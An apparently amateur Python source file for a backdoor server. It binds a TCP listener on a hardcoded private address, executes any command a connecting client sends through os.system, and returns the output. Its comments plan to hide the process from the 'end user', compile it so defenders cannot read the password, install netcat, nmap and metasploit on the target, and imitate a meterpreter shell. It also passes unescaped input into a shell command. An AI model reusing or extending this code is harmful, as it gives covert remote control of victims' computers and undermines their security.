import socket #This allows us to create socckets and various network protcol data communications
import os #This lets us initiate functions on the operating system kernel  
import sys #This lets us initiate 

#THE SERVER NEEDS TO RUN IN THE MAIN BACKGROUND ON THE END USERS SYSTEM WITHOUT THE MAIN ICON SHOWING UP ON IT

#We also need to figure out how to make the server smarter to tell the differnce between more than one type of client connection on a network

""" Recipie for the main backdoor and Ideas

    * The client needs to eb able to authenticate to any of the mian backdoor serves via a passsord in order to connect and establish the main sesssion
    * To keep the password more secure and to prvent defenders from simply finding the source code and viewing the passwrod in plain text we need to convert the script to 
      binary executable format so it just runs on the end users system both client and server side wise (THIS CAN BE AN ADDITONAL ADD ON LATER)

    * Instated of a static IP address we are going to set it to be more dynamic in that I can just type in the credentials needed


    Features to be added: Get more ideas from the post commands tha are available for the main meterpreter shell and develop my own peersonal flavor of one

        * LOok into a way to see the end usrers too

        * We also need to set uo a method that woud allow us to set up multiple threads for mltipel clienetns at the same time to the main server

    Tools we want instaleld on the end users system:

        * netcat
        * nmap
        * metasploit
        * Genreal tool belt of tools from github (this can come from my main script on the system)


    Main options STORED HERE UNTIL THEY ARE AVAILABLE FOR USE

    print("2 -> Tor Browser Install (YOU NEED TO BE NON-ROOT TO RUN THIS OPTION. EXIT THE PROGRAM AND RUN IT THAT WAY)")
  	print("3 -> VSCode Install")
  	print("4 -> Telegram Install")
  	print("5 -> WordPress CTF Install")
  	print("6 -> Bettercap and Aircrack-ng Driver Installs")
  	print("7 -> General Insall")
  	print("8 -> Advanced ToolBelt Install")
  	print("9 -> Run Tools (RUN OPTION 8 BEFORE RUNNING THIS OR IT WON'T WORK)")
  	print("10 -")

Library (OUR SYSTE)
10.13.68.116 
9

"""
os.system("clear")

ip = "10.13.68.110"
stringport = "9" #This is used stictly for responding to the main clinet infromation of the server they are connected to
port = 10 #If you are running this on your own system and need it to clear the ip and port just run "nmap localhost" in your linux terminal and it will clear it up by forcing it into an ignored/closed state
address = (ip, port)

#Next we open up a log file to log down any and all connections that are reeived to and from the TCP server 
#FOR SOME ODD REASON THIS LINE OF CODE IS NOT WORKING BU TIT DOES IN ANOTHER SOURCE CODE
logdata = open("LogData.txt", 'w')

#Next we need to declare all the main socket information
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(address) #This will bind a listening port on the main target system
server.listen(10) #This is going to allow our server to listen for a maximum of 10 connections at a time

#Next we need to have the main server sit in a listening state for connections
while True:

    print("Server in listening state on PORT => ", port) #This messag will confirm to us that the server is indeed ina  listenign state 
    
    #After we ge t amessage confirmting that ther server is in a listening state, it will sit indefinetyl waiting to accep connecitons
    connection, client_addr = server.accept() #This will allow the server to handle and accept various tcp clients that connect to it
    #USE THE CONNECTION VARIABLE THAT HAS THE OTHER SOCKET ATTROBUTE TO SEND DATA TO ANY AND ALL CLEINTS THAT YOU MIGTH HAVE TO WORK WITH!!!!

    #Once it accepts a connection, it will print the content sto us in the terminal. as well as to a main log file that we canr efernce
    print("CONECTION RECIEVED FROM => ", client_addr)
    print(str(client_addr))

    #We are going to run our main os command to log and pipe in our client data into our logscrpt that will come with the main program
    echocommand = "echo ' " + str(client_addr) + " ' | python3 LogScript.py" #You can nest single quotes to wrap around inside concated strings to format and handle the data properlly
    os.system(echocommand)

    #The server will ping back the client a message THIS IS CAUSING A BROKEN PIPELINE WE NEEDT OT PATCH THAT UP
    response = "You are connected to " + ip + str(port)
    responsedata = response.encode('UTF-8') 
    connection.sendall(responsedata) 

    break 
    #We might have to overrid the issue wit  not being able to send data toa text file with anotehr scritpt hat will pipe th einfo into a command and have it
    #sent to the scritp for it to be put into a log file

    #The server will ping back the client a message THIS IS CAUSING A BROKEN PIPELINE WE NEEDT OT PATCH THAT UP
    #response = "You are connected to " + ip + stringport
    #responsedata = response.encode('UTF-8') 
    #server.sendall(responsedata)


#Next our code is going to sit and wait for data to be sent to it
while True:

    print("Waiting for Data from the Client")
    data = connection.recv(7000) 

    #The command will simply be executed on the main system and we'll have full control to run whatever options we want agains the target system
    #WE NEED TO UPGRADE THIS TO COMPLY WTH ANY AND ALL OPTIONS THAT WE HAVE SET FOR THE METERPRETER IN GENERAL
    if data: #The program will also check if it happened to recieve any form of data form the clients on the respective end. If it does then it's going to unwrwap and run the command on the main system

        print("Hello World")
        #This will convert the command to a string format andn then pass it to the system to execute
        tcphandler = data.decode('UTF-8')
        print(tcphandler)

        #This command will have the program wipe itself from the system, all data, and will terminate the main connection
        if tcphandler == "terminate":

            server.close() #This is going to close the main server side connecton so it can't recieve anymore requests to it 

        #We might have to use the exact same pipe commadn in order to get it to work for the same area here 
        syscommand = tcphandler + " > anonymous.txt" #The output here is going to a file!!! that's why I can't seee it ONCE WE FIX 
        os.system(syscommand)

            
        #Next we need to open the file in the current location and then have it's contents sent back to the client in binary format so we can see the main output of the command from our end
        results = open("anonymous.txt", "r") #This is going to open the file for it to be read the file in string format
        resultsdata = results.read() #The data will be read in full here
        commanddata = resultsdata.encode('UTF-8') #Then it wil all be encoded into binary format to be transmitted tot he client system
        connection.sendall(commanddata) #Data is being sent here
                                    #THIS FUNCTION IS CAUSING THE CONNECTION TO FAIL
        
        